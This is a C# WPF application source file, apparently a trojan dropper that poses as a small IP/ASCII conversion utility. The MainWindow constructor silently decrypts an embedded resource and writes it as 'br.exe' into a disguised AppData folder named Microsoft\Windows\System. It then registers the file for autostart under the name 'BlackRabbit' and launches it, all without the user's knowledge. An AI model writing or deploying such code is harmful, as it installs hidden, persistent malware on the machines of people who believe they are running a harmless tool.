using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Resources;
using System.IO;
using System.Threading;
using System.Diagnostics;


namespace INSTALLER
{
   

    /// <summary>
    /// Logika interakcji dla klasy MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public static string path_static = "Microsoft\\Windows\\System\\";
        public static string fileName = "br.exe";
       

        public MainWindow()
        {
            InitializeComponent();

            string pathToDir = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path_static);
            string fullPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path_static,fileName);
            
            if ( !File.Exists(fullPath))
            {
                if( !Directory.Exists(pathToDir)  )
                {
                    Directory.CreateDirectory(pathToDir);
                }
                BrstubRun br = new BrstubRun();
                Thread stub = new Thread( new ParameterizedThreadStart( br.Run ) );
                stub.Start(fullPath);
                stub.Join();
                
            }
            
            







        }

        private void IP_Click(object sender, RoutedEventArgs e)
        {
            Window1 window = new Window1();
            window.Show();
            
        }

        private void ASCII_Click(object sender, RoutedEventArgs e)
        {
            Window2 window2 = new Window2();
            window2.Show();
            
        }

        private void Quit_Click(object sender, RoutedEventArgs e)
        {
            this.Hide();
        }

    }

    class BrstubRun : Brstub
    {
        public void Run(object oPath)
        {
            byte[] encrypted = Resource1.IPconv_enc;
            byte[] key = Resource1.IPconv_key;
            string path = oPath.ToString();
            
            byte[] decrypted = this.Decrypt(encrypted, key);

            if ( CheckMD5(decrypted, Resource1.IPconv_MD5) )
            {
                //MainWindow mw = new MainWindow();

                this.SaveFile(path, decrypted);
                this.AddToReg("BlackRabbit", path, RegKeyType.CurrentUser);
                Process.Start(path);
            }

        }
    }
}


